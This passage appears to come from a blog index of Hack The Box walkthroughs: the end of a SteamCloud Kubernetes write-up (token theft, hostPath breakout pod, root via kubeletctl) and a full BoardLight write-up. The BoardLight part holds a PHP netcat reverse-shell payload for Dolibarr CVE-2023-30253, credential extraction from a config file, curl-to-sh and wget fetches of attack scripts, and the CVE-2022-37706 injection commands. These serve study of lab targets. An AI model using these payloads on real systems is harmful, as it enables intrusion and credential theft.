NJS_VERSION=1.14.2.0.2.6-1~stretch NGINX_VERSION=1.14.2-1~stretch KUBERNETES_PORT_443_TCP_PROTO=tcp KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1 KUBERNETES_PORT=tcp://10.96.0.1:443 PWD=/root HOME=/root KUBERNETES_SERVICE_PORT_HTTPS=443 KUBERNETES_PORT_443_TCP_PORT=443 KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443 TERM=xterm SHLVL=1 KUBERNETES_SERVICE_PORT=443 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin KUBERNETES_SERVICE_HOST=10.96.0.1 OLDPWD=/var/run/secrets/kubernetes.io/serviceaccount _=/usr/bin/env The mounted directory:\nroot@nginx:~# df -h df -h Filesystem Size Used Avail Use% Mounted on overlay 8.9G 3.2G 5.6G 37% / tmpfs 64M 0 64M 0% /dev tmpfs 2.0G 0 2.0G 0% /sys/fs/cgroup /dev/sda1 8.9G 3.2G 5.6G 37% /root shm 64M 0 64M 0% /dev/shm tmpfs 3.9G 12K 3.9G 1% /run/secrets/kubernetes.io/serviceaccount tmpfs 2.0G 0 2.0G 0% /proc/acpi tmpfs 2.0G 0 2.0G 0% /sys/firmware root@nginx:~# cd /run/secrets/kubernetes.io/serviceaccount cd /run/secrets/kubernetes.io/serviceaccount root@nginx:/run/secrets/kubernetes.io/serviceaccount# ls ca.crt\tnamespace token What is a Kubernetes Serviceaccount? A ServiceAccount is an identity for processes running inside Pods. When a Pod runs, by default Kubernetes mounts credentials for a ServiceAccount into the Pod so the process can call the Kubernetes API as that identity. These credentials are how workloads authenticate to the API server.\nWhat lives at /run/secrets/kubernetes.io/serviceaccount directory? Inside most container images we\u0026rsquo;ll see these files:\ntoken - a JWT bearer token. This token lets the Pod authenticate to the API server. ca.crt - CA certificate to validate the API server TLS certificate. namespace - the namespace the Pod is running in. Why this matters for privilege escalation If an attacker can read that token file inside a pod, they can use that token to call the Kubernetes API and act with whatever RBAC permissions the ServiceAccount has.\nDiscovery: enumerate pods, namespaces, secrets, nodes, roles. Privilege escalation: if the service account has wide permissions, can create resources (new Pods, ClusterRoleBindings) to escalate to cluster-admin or access sensitive secrets such as cloud credentials. Lateral movement: read secrets, mount host filesystem, create pods with host access to extract files. Privilege Escalation Let\u0026rsquo;s go inside the /run/secrets/kubernetes.io/serviceaccount and save the CA.crt and token file in local system so we can use it to check the permission this token has.\nSave the token: Save the ca.crt: Now, Let\u0026rsquo;s use the kubectl tool whichÂ allows user to interact with the Kubernetes API and the control plane.\nWe tried to use this token with the server ip 10.10.11.133 with port 10250 but server send us the certificate validation related error.\nCommand:\nkubectl --server https://10.10.11.133:10250 --certificate-authority=ca.crt --token=token get namespaces Server Validation Error:\nE1002 23:16:05.190516 35485 memcache.go:265] \u0026#34;Unhandled Error\u0026#34; err=\u0026#34;couldn\u0026#39;t get current server API group list: Get \\\u0026#34;https://10.10.11.133:10250/api?timeout=32s\\\u0026#34;: tls: failed to verify certificate: x509: cannot validate certificate for 10.10.11.133 because it doesn\u0026#39;t contain any IP SANs\u0026#34; E1002 23:16:05.890616 35485 memcache.go:265] \u0026#34;Unhandled Error\u0026#34; err=\u0026#34;couldn\u0026#39;t get current server API group list: Get \\\u0026#34;https://10.10.11.133:10250/api?timeout=32s\\\u0026#34;: tls: failed to verify certificate: x509: cannot validate certificate for 10.10.11.133 because it doesn\u0026#39;t contain any IP SANs\u0026#34; We have updated the port number from 10250 to 8443. The reason is we have seen the access forbidden error. Let\u0026rsquo;s pass the token value and ca.crt file which will help server to validate the user access request.\nWe tried to list he pods and we are able to list the pods. From here what we can do is check what kind of permission that token and use it to get root flag.\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pods NAME READY STATUS RESTARTS AGE nginx 1/1 Running 0 99m User doesn\u0026rsquo;t have permission to get namespace:\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get namespaces Error from server (Forbidden): namespaces is forbidden: User \u0026#34;system:serviceaccount:default:default\u0026#34; cannot list resource \u0026#34;namespaces\u0026#34; in API group \u0026#34;\u0026#34; at the cluster scope The user has permission to check permission:\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token auth can-i --list Resources Non-Resource URLs Resource Names Verbs selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] pods [] [] [get create list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [/api] [] [get] [/apis/*] [] [get] [/apis] [] [get] [/healthz] [] [get] [/healthz] [] [get] [/livez] [] [get] [/livez] [] [get] [/openapi/*] [] [get] [/openapi] [] [get] [/openid/v1/jwks] [] [get] [/readyz] [] [get] [/readyz] [] [get] [/version/] [] [get] [/version/] [] [get] [/version] [] [get] [/version] [] [get] List the permission table which shows user can get, create and list pods. Let\u0026rsquo;s create a pod with accessive privilege which can be use to do pod breakout.\nPod creation policy, which can be used to do Pod Breakout:\napiVersion: v1 kind: Pod metadata: name: breakout namespace: default spec: hostNetwork: true automountServiceAccountToken: true containers: - name: breakout image: nginx:latest volumeMounts: - mountPath: /root name: mount-root volumes: - name: mount-root hostPath: path: / Use Pod creation policy to create a pod with elevated privileges:\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f Pod-Breakout.yaml pod/breakout created You can also refer to the detailed blog presented bishopfox. They have discussed 8 different scenarios based on the limited pod creation permission user has. Checkout the blog it\u0026rsquo;s actually interesting one to read.\nLet\u0026rsquo;s use the kubectl get pods command with the ca.crt file and token. It was observed that the pod we created is up and running. Let\u0026rsquo;s move back to the kubeletctl tool because we don\u0026rsquo;t have pod execution permission with the token we are using in the kubectl command.\nkubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pods NAME READY STATUS RESTARTS AGE breakout 1/1 Running 0 36s nginx 1/1 Running 0 102m Run the kubeletctl with whoami command on the breakout pod, and we are already running as root.\nkubeletctl exec \u0026#34;whoami\u0026#34; -p breakout -c breakout --server 10.10.11.133 root Let\u0026rsquo;s take a shell\nkubeletctl exec \u0026#34;/bin/bash\u0026#34; -p breakout -c breakout --server 10.10.11.133 root@steamcloud:/# Root Flag ğŸš© root@steamcloud:~/root# ls root.txt root@steamcloud:~/root# cat root.txt REDECTED_FLAG_VALUE Conclusion Streamcloud is a compact but instructive lab that highlights how small misconfigurations in Kubernetes, like overly permissive service accounts, exposed APIs, or incorrect RBAC rules, quickly turn into full cluster compromise. The lab reinforces that Kubernetes security is a shared responsibility: developers, SREs, and security teams all need to work together to reduce blast radius.\nKey Takeaways Always apply least privilege - avoid granting cluster-admin or wildcard verbs to serviceAccounts. Expose only necessary APIs - kubelet and API server endpoints should be firewall/ACL protected. RBAC misconfigurations are a frequent root cause - regularly review roles, roleBindings, clusterRoles, and clusterRoleBindings. References https://kubernetes.io/docs/reference/networking/ports-and-protocols/#control-plane https://www.cyberark.com/resources/threat-research-blog/using-kubelet-client-to-attack-the-kubernetes-cluster https://www.covertswarm.com/post/k8s-pod-to-node-escape-techniques https://bishopfox.com/blog/kubernetes-pod-privilege-escalation https://github.com/cyberark/kubeletctl/ Connect with me LinkedIn Twitter GitHub ","permalink":"https://bhavik-kanejiya.github.io/blog/htb-steamcloud-walkthrough/","summary":"This Streamcloud HTB walkthrough demonstrates a realistic Kubernetes pentest from initial cluster discovery to full privilege escalation. Youâ€™ll learn practical techniques for enumerating namespaces, identifying exposed kubelets and serviceAccounts, exploiting weak RBAC and misconfigured resources, and how to remediate these issues from a developer and ops perspective. Ideal for pentesters learning K8s attack paths and for engineers wanting to harden clusters.","title":"HTB SteamCloud Walkthrough"},{"content":"Box Info Attribute Details Level Easy OS Linux Box URL https://app.hackthebox.com/machines/603/ Box Status Retired About Box BoardLight is an easy-difficulty Linux machine that features a Dolibarr instance vulnerable to CVE-2023-30253. This vulnerability is leveraged to gain access as www-data. After enumerating and dumping the web configuration file contents, plaintext credentials lead to SSH access to the machine. Enumerating the system, a SUID binary related to enlightenment is identified which is vulnerable to privilege escalation via CVE-2022-37706 and can be abused to leverage a root shell. Footprinting Nmap Letâ€™s start by scanning the machine with Nmap to identify which services are running on different ports.\nNmap Scan - Basic nmap -p- --min-rate 10000 $ip -oN 1.basic.nmap.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 21:41 IST Warning: 10.10.11.11 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.11 The host is up (0.27s latency). Not shown: 61627 closed TCP ports (conn-refused), 3906 filtered TCP ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 58.63 seconds Nmap Scan - Detailed nmap -Pn -sCV -p 22,80 10.10.11.11 -oN 3.detailed.nmap.txt Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 21:46 IST Nmap scan report for 10.10.11.11 Host is up (0.31s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA) | 256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA) |_ 256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.77 seconds It was observed that the machine has ports 22(SSH) and 80 (HTTP) open. Let\u0026rsquo;s do further enumeration and find out ways to catch the flag.\nPort 22 SSH We tried the same for SSH by attempting an anonymous login, but it was unsuccessful.\nAnonymous Access - Denied\n\u0026gt; ssh anonymous@10.10.11.11 anonymous@10.10.11.11\u0026#39;s password: Permission denied, please try again. Port 80 HTTP \u0026gt; curl -I http://boardlight.htb/ HTTP/1.1 200 OK Date: Wed, 02 Jul 2025 16:31:42 GMT Server: Apache/2.4.41 (Ubuntu) Content-Type: text/html; charset=UTF-8 Let\u0026rsquo;s start with checking the security headers. Here application is responding with a basic header, which shows the server information Apache/2.4.41 (Ubuntu)\nVisual Presentation: Letâ€™s add boardlight host to our /etc/hosts file:\necho \u0026#34;10.10.11.11 board.htb\u0026#34; | sudo tee -a /etc/hosts Application doesn\u0026rsquo;t contain much functionality. It\u0026rsquo;s just static website running on php and with minimal design. We can go with subdomain enumeration which can give us some more attack path. We will start vhost enumeration using gobuster or ffuf.\nVirtual Host Subdomain Enumeration \u0026gt; gobuster vhost -u http://board.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://board.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.6 [+] Timeout: 10s [+] Append Domain: true =============================================================== Starting gobuster in VHOST enumeration mode =============================================================== Found: crm.board.htb Status: 200 [Size: 6360] Subdomain - crm.board.htb We have identified the crm.board.htb subdomain during the subdomain enumeration process. It\u0026rsquo;s running the Dolibarr with version 17.0.0\nWhat is Dolibarr?\nDolibarr is a free and open-source ERP (Enterprise Resource Planning) and CRM (Customer Relationship Management) software designed for small to medium-sized businesses, freelancers, and non-profits.\nHeaders:\nâ¯ curl -i http://crm.board.htb HTTP/1.1 200 OK Date: Wed, 02 Jul 2025 17:00:29 GMT Server: Apache/2.4.41 (Ubuntu) Expires: Thu, 19 Nov 1981 08:52:00 GMT Pragma: no-cache Cache-Control: Public, must-revalidate X-Content-Type-Options: nosniff X-Frame-Options: SAMEORIGIN Referrer-Policy: same-origin Set-Cookie: DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=ajak7d8hjulbg1l4ulve30t8gj; path=/; HttpOnly; SameSite=Lax Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8 Possible available exploit: No exploit available for Dolibarr version 17.0.0 on searchsploit\nAfter doing further research about Dolibarr, it was identified that the application version 17.0.0 is vulnerable to authenticated remote code execution. We don\u0026rsquo;t have dashboard credentials, so we have to find them.\nI came across a Dolibarr forum discussion about default credentials where community members are discussing about the default credentials. The default credentials for the dolibarr cms are Admin: admin\nForum Discussion: https://www.dolibarr.org/forum/t/login-after-installation/16088/5\nOnce we successfully authenticate to the portal, we can see the dashboard where users can manage users, set up the application and create a new website as well.\nFrom the Github repo of Dolibarr, it was observed that Dolibarr uses PHP, which is an interesting thing.\nNow that we have access to the Dolibarr admin panel, we can proceed with exploitation.\nWhat is CVE-2023-30253? Dolibarr before 17.0.1 allows remote code execution by an authenticated user via an uppercase manipulation: \u0026lt;?PHP instead of \u0026lt;?php in injected data.\nSeverity: High (8.8/10)\nCVSS v3 base metrics Attack vector Network Attack complexity Low Privileges required Low User interaction None Scope Unchanged Confidentiality High Integrity High Availability High Exploiting RCE in Dolibarr (CVE-2023-30253) Create the Website and enter the website name and description. Once website name is created create new page and enter the page name and title Initially, We start with normal system command to with basic php syntax. Response: Application throws an error saying \u0026ldquo;system\u0026rdquo; function is forbidden. As per CVE-2023-30253 description, We will change the php syntax from php to pHp. Response: We are successfully able to execute the system command. We will use netcat bind shell to get the shell Code Snippet for Netcat Bind Shell:\n\u0026lt;section id=\u0026#34;mysection1\u0026#34; contenteditable=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;?pHp system(\u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2\u0026gt;\u0026amp;1 | nc 10.10.14.4 1337 \u0026gt; /tmp/f\u0026#34;); ?\u0026gt; \u0026lt;/section\u0026gt; We got the connection back from the crm portal. TTY Stable Shell:\npython3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; export TERM=xterm Ctrl + Z stty raw -echo; fg Alternative and easy way - metasploit We can also use the Metasploit to exploit the RCE and get the shell which requires username, password and hostname.\nRead More Here:\nhttps://www.rapid7.com/db/modules/exploit/linux/http/dolibarr_cmd_exec/\nGetting User shell We have the access as a www-data user. First thing we tried was to check can we access home directory because user.txt file will be there. There is one directory which is called larissa. The user www-data doesn\u0026rsquo;t have access to that directory.\nwww-data@boardlight:/home$ ls -al total 12 drwxr-xr-x 3 root root 4096 May 17 2024 . drwxr-xr-x 19 root root 4096 May 17 2024 .. drwxr-x--- 15 larissa larissa 4096 May 17 2024 larissa www-data@boardlight:/home$ whoami www-data www-data@boardlight:/home$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@boardlight:/home$ cd larissa/ bash: cd: larissa/: Permission denied The directory structure suggests there is a user named larissa. Check the user existence by reading the cat /etc/passwd file.\nOutput of /etc/passwd file:\nwww-data@boardlight:/tmp$ cat /etc/passwd | grep \u0026#34;larissa\u0026#34; larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash We don\u0026rsquo;t have access to any interesting so we start looking at the application code available here at /var/www/html, which contains the application code for board.htb and crm.board.htb.\nwww-data@boardlight:/$ cd /var/www/html www-data@boardlight:~/html$ ls board.htb crm.board.htb We start exploitation by looking at the code for board.htb. It doesn\u0026rsquo;t contain any connection string or any specific database connection file, which we usually observe in a PHP application. The board.htb is a normal static application without any functionality.\nwww-data@boardlight:~/html/board.htb$ ls -al total 72 drwxr-xr-x 5 www-data www-data 4096 May 17 2024 . drwxr-xr-x 4 www-data www-data 4096 May 17 2024 .. -rw-rw-r-- 1 larissa larissa 9100 May 15 2024 about.php -rw-rw-r-- 1 larissa larissa 9426 May 15 2024 contact.php drwxrwxr-x 2 larissa larissa 4096 May 17 2024 css -rw-rw-r-- 1 larissa larissa 9209 May 15 2024 do.php drwxrwxr-x 2 larissa larissa 4096 May 17 2024 images -rw-rw-r-- 1 larissa larissa 15949 May 15 2024 index.php drwxrwxr-x 2 larissa larissa 4096 May 17 2024 js www-data@boardlight:~/html/board.htb$ ls -al js/ total 228 drwxrwxr-x 2 larissa larissa 4096 May 17 2024 . drwxr-xr-x 5 www-data www-data 4096 May 17 2024 .. -rw-rw-r-- 1 larissa larissa 131639 May 15 2024 bootstrap.js -rw-rw-r-- 1 larissa larissa 88145 Aug 1 2019 jquery-3.4.1.min.js The /var/www/html directory contains the documentation and all the files for board.htb and crm.board.htb. There are multiple files available, which is too much for a quick search.\nThe crm.board.htb contains multiple files because it\u0026rsquo;s a crm application. We can search for configuration or backup files that may contain the username, password or database connection strings.\nwww-data@boardlight:~/html/crm.board.htb$ ls -al total 632 drwxr-xr-x 6 www-data www-data 4096 May 17 2024 . drwxr-xr-x 4 www-data www-data 4096 May 17 2024 .. drwxr-xr-x 4 www-data www-data 4096 Mar 4 2023 .github -rw-r--r-- 1 www-data www-data 251 Mar 4 2023 .gitmessage -rw-r--r-- 1 www-data www-data 211 Mar 4 2023 .stickler.yml -rw-r--r-- 1 www-data www-data 35151 Mar 4 2023 COPYING -rw-r--r-- 1 www-data www-data 6929 Mar 4 2023 COPYRIGHT -rw-r--r-- 1 www-data www-data 508715 Mar 4 2023 ChangeLog -rw-r--r-- 1 www-data www-data 1366 Mar 4 2023 DCO -rw-r--r-- 1 www-data www-data 8016 Mar 4 2023 README-FR.md -rw-r--r-- 1 www-data www-data 10282 Mar 4 2023 README.md -rw-r--r-- 1 www-data www-data 6605 Mar 4 2023 SECURITY.md -rw-r--r-- 1 www-data www-data 1911 Mar 4 2023 composer.json.disabled drwxr-xr-x 11 www-data www-data 4096 May 13 2024 documents drwxr-xr-x 79 www-data www-data 4096 Mar 4 2023 htdocs -rw-r--r-- 1 www-data www-data 741 Mar 4 2023 nightwatch.conf.js -rw-r--r-- 1 www-data www-data 11965 Mar 4 2023 phpstan.neon -rw-r--r-- 1 www-data www-data 95 Mar 4 2023 robots.txt drwxr-xr-x 16 www-data www-data 4096 Mar 4 2023 scripts It was observed that the application has one interesting directory which contains the application configuration file here at html/crm.board.htb/htdocs/conf.\nwww-data@boardlight:~/html/crm.board.htb/htdocs$ cd conf/ www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls conf.php conf.php.example conf.php.old Upon opening the conf.php file, It was observed that it contains the database credentials like username, password and host and port details.\nConfiguration file content:\n\u0026lt;?php // // File generated by Dolibarr installer 17.0.0 on May 13, 2024 // // Take a look at conf.php.example file for an example of the conf.php file // and explanations for all possibles parameters. // $dolibarr_main_url_root=\u0026#39;http://crm.board.htb\u0026#39;; $dolibarr_main_document_root=\u0026#39;/var/www/html/crm.board.htb/htdocs\u0026#39;; $dolibarr_main_url_root_alt=\u0026#39;/custom\u0026#39;; $dolibarr_main_document_root_alt=\u0026#39;/var/www/html/crm.board.htb/htdocs/custom\u0026#39;; $dolibarr_main_data_root=\u0026#39;/var/www/html/crm.board.htb/documents\u0026#39;; $dolibarr_main_db_host=\u0026#39;localhost\u0026#39;; $dolibarr_main_db_port=\u0026#39;3306\u0026#39;; $dolibarr_main_db_name=\u0026#39;dolibarr\u0026#39;; $dolibarr_main_db_prefix=\u0026#39;llx_\u0026#39;; $dolibarr_main_db_user=\u0026#39;dolibarrowner\u0026#39;; $dolibarr_main_db_pass=\u0026#39;#############\u0026#39;; $dolibarr_main_db_type=\u0026#39;mysqli\u0026#39;; $dolibarr_main_db_character_set=\u0026#39;utf8\u0026#39;; $dolibarr_main_db_collation=\u0026#39;utf8_unicode_ci\u0026#39;; // Authentication settings $dolibarr_main_authentication=\u0026#39;dolibarr\u0026#39;; //$dolibarr_main_demo=\u0026#39;autologin,autopass\u0026#39;; // Security settings $dolibarr_main_prod=\u0026#39;0\u0026#39;; $dolibarr_main_force_https=\u0026#39;0\u0026#39;; $dolibarr_main_restrict_os_commands=\u0026#39;mysqldump, mysql, pg_dump, pgrestore\u0026#39;; $dolibarr_nocsrfcheck=\u0026#39;0\u0026#39;; $dolibarr_main_instance_unique_id=\u0026#39;ef9a8f59524328e3c36894a9ff0562b5\u0026#39;; $dolibarr_mailing_limit_sendbyweb=\u0026#39;0\u0026#39;; $dolibarr_mailing_limit_sendbycli=\u0026#39;0\u0026#39;; $dolibarr_main_distrib=\u0026#39;standard\u0026#39;; Attempt 1 We have now credentials for the database connection. I have observed one interesting thing when reading the machine description:\nAfter enumerating and dumping the web configuration file contents, plaintext credentials lead to SSH access to the machine.\nKind of rabbit hole? Yessssss!ğŸ«£\nI tried to access the user dolibarr with the password given for that user. It was a trap. Attempt 2 We try to log in as a root using the password we found in the configuration file. It was showing the authentication failure.\nwww-data@boardlight:~/html$ su - Password: su: Authentication failure Let\u0026rsquo;s try to log in with user larissa with the same password. Looks like it worked!!!\nwww-data@boardlight:~/html$ su - larissa Password: larissa@boardlight:~$ whoami larissa Credentials:\nUsername: larissa Password: ############# User Flag ğŸš© RunÂ dir command to list the files and folders\nlarissa@boardlight:~$ ls Desktop Downloads Pictures Templates Videos Documents Music Public user.txt We have the user.txt flag here!!!\nlarissa@boardlight:~$ cat user.txt ############################### Exploiting Dolibarr for RCE (CVE-2023-30253) Linpeas larissa@boardlight:~$ curl -L http://10.10.16.5:8000/linpeas.sh | sh Interesting Output from linpease:\n-rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-sr-x 1 root root 15K Apr 8 2024 /usr/lib/xorg/Xorg.wrap -rwsr-xr-x 1 root root 27K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys ---\u0026gt; Before_0.25.4_(CVE-2022-37706) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd ---\u0026gt; Before_0.25.4_(CVE-2022-37706) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight ---\u0026gt; Before_0.25.4_(CVE-2022-37706) -rwsr-xr-x 1 root root 15K Jan 29 2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!) -rwsr-xr-- 1 root messagebus 51K Oct 25 2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 467K Jan 2 2024 /usr/lib/openssh/ssh-keysign -rwsr-xr-- 1 root dip 386K Jul 23 2020 /usr/sbin/pppd ---\u0026gt; Apple_Mac_OSX_10.4.8(05-2007) -rwsr-xr-x 1 root root 44K Feb 6 2024 /usr/bin/newgrp ---\u0026gt; HP-UX_10.20 -rwsr-xr-x 1 root root 55K Apr 9 2024 /usr/bin/mount ---\u0026gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 163K Apr 4 2023 /usr/bin/sudo ---\u0026gt; check_if_the_sudo_version_is_vulnerable -rwsr-xr-x 1 root root 67K Apr 9 2024 /usr/bin/su -rwsr-xr-x 1 root root 84K Feb 6 2024 /usr/bin/chfn ---\u0026gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 39K Apr 9 2024 /usr/bin/umount ---\u0026gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 87K Feb 6 2024 /usr/bin/gpasswd -rwsr-xr-x 1 root root 67K Feb 6 2024 /usr/bin/passwd ---\u0026gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 52K Feb 6 2024 /usr/bin/chsh -rwsr-xr-x 1 root root 15K Oct 27 2023 /usr/bin/vmware-user-suid-wrapper Another way to find a package with special permission:\nfind / -perm -4000 2\u0026gt;/dev/null Here in the output, it was observed that the enlightenment package is vulnerable to CVE-2022-37706, which allows local users to escalate their privileges to root level.\nLet\u0026rsquo;s grep the enlightenment package name and confirm its availability:\ndpkg -l | grep \u0026#34;enlightenment\u0026#34; Enlightenment - CVE-2022-37706 Enlightenment is a lightweight, eye-candy-rich X11 window manager and desktop environment for Linux and UNIX systems. It is designed for speed and customisation, offering advanced features like compositing, animations, and modular design. While not as mainstream as GNOME or KDE, itâ€™s popular in niche or performance-focused Linux setups.\nCVE-2022-37706 is a local privilege escalation vulnerability in the enlightenment_sys binary. It arises due to improper sanitisation of user input passed to shell commands.\nSpecifically, enlightenment_sys uses the system() function to call mount with user-provided paths. If an attacker supplies a malicious path that includes shell metacharacters (like ;), they can inject arbitrary commands. Because enlightenment_sys runs as root, those injected commands are executed as root. Systems running a vulnerable version of Enlightenment (before v0.25.4) are highly exploitable\nExploit CVE-2022-37706 The enlightenment is running on version 0.23.1, which is vulnerable to CVE-2022-37706.\nlarissa@boardlight:~$ enlightenment --version ESTART: 0.00001 [0.00001] - Begin Startup ESTART: 0.00007 [0.00007] - Signal Trap ESTART: 0.00009 [0.00002] - Signal Trap Done ESTART: 0.00011 [0.00002] - Eina Init ESTART: 0.00047 [0.00037] - Eina Init Done ESTART: 0.00052 [0.00004] - Determine Prefix ESTART: 0.00075 [0.00023] - Determine Prefix Done ESTART: 0.00077 [0.00002] - Environment Variables ESTART: 0.00079 [0.00002] - Environment Variables Done ESTART: 0.00080 [0.00001] - Parse Arguments Version: 0.23.1 E: Begin Shutdown Procedure! larissa@boardlight:/tmp$ wget 10.10.14.5/exploit.sh --2025-07-02 23:59:29-- http://10.10.14.5/exploit.sh Connecting to 10.10.14.5:80... connected. HTTP request sent, awaiting response... 200 OK Length: 709 [text/x-sh] Saving to: â€˜exploit.shâ€™ exploit.sh 100%[============================================================================\u0026gt;] 709 --.-KB/s in 0s 2025-07-02 23:59:29 (45.8 MB/s) - â€˜exploit.shâ€™ saved [709/709] larissa@boardlight:/tmp$ chmod +x exploit.sh larissa@boardlight:/tmp$ ./exploit.sh CVE-2022-37706 [*] Trying to find the vulnerable SUID file... [*] This may take few seconds... [+] Vulnerable SUID binary found! [+] Trying to pop a root shell! [+] Enjoy the root shell :) mount: /dev/../tmp/: can\u0026#39;t find in /etc/fstab. # whoami root Root Flag ğŸš© # ls root.txt # cat root.txt ############################### How does CVE-2022-37706 works? Find the SUID binaries on the system files that run with root find / -perm -4000 2\u0026gt;/dev/null find /: Search recursively starting from the root / directory. -perm -4000: Look for files with the SUID (Set User ID) bit set. 4000 is the octal permission flag for the SUID bit. This means the file, when executed, runs with the permissions of its owner (usually root), not the user who launched it. 2\u0026gt;/dev/null: Silences permission-denied errors by redirecting STDERR (file descriptor 2) to /dev/null Output:\n/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight This binary is setuid root, which means it always runs with root privileges. It\u0026rsquo;s supposed to wrap commands like mount safely, but it uses system() and fails to sanitize input properly. Step 1: Setup Required Directory mkdir -p /tmp/net mkdir -p \u0026#34;/dev/../tmp/;/tmp/exploit\u0026#34; The first line creates a target mount point (/tmp/net). The second line creates a maliciously crafted path that: Starts with /dev/.. to bypass Enlightenmentâ€™s path sanitization. Contains a semicolon ;, which breaks the command and starts a new one: /tmp/exploit Step 2: Write into file and Permission assignment echo \u0026#34;/bin/sh\u0026#34; \u0026gt; /tmp/exploit chmod a+x /tmp/exploit This creates a file /tmp/exploit that, when executed, opens a shell. With chmod a+x, it\u0026rsquo;s made executable. Step 3: Trigger the exploit /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys \\ /bin/mount \\ -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), \\ \u0026#34;/dev/../tmp/;/tmp/exploit\u0026#34; \\ /tmp///net # This command exploits CVE-2022-37706 by injecting a command via the mount path. # The semicolon (;) in the path allows execution of /tmp/exploit as root. It looks like a normal mount command wrapped by enlightenment_sys.\nenlightenment_sys passes this entire string to system(...) without escaping. The semicolon ; splits the command. The second part /tmp/exploit executes independently as root. When enlightenment runs the final command It will become like this:\n/bin/mount -o ... /dev/../tmp/; /tmp/exploit /tmp///net The part after the semicolon (/tmp/exploit) is executed as root, opening a root shell.\nConclusion Boardlight is a great hands-on example of how small oversights in system-level binaries can lead to complete system compromise. From a fairly simple web foothold to a local privilege escalation via a public CVE, the machine teaches the value of enumeration and understanding the behaviour of SUID programs. It reinforces that post-exploitation knowledge is just as crucial as initial access.\nKey Takeaways Checking for SUID binaries can quickly reveal potential privilege escalation vectors. CVE-2022-37706 is a prime example of how input sanitisation failures in root-level binaries can lead to full system compromise. References https://www.wiz.io/vulnerability-database/cve/cve-2023-30253 https://security.snyk.io/vuln/SNYK-PHP-DOLIBARRDOLIBARR-5660595 https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253 https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit https://www.wiz.io/vulnerability-database/cve/cve-2022-37706 https://0xdf.gitlab.io/2024/09/28/htb-boardlight.html Connect with Me LinkedIn Twitter GitHub Hack The Box ","permalink":"https://bhavik-kanejiya.github.io/blog/htb-boardlight-walkthrough/","summary":"Boardlight is a medium-difficulty Linux box on Hack The Box that showcases real-world privilege escalation via a vulnerable SUID binary. The machine walks you through basic enumeration, exploiting a web-based login system, and ultimately leveraging the CVE-2022-37706 vulnerability in Enlightenmentâ€™s enlightenment_sys utility to gain root 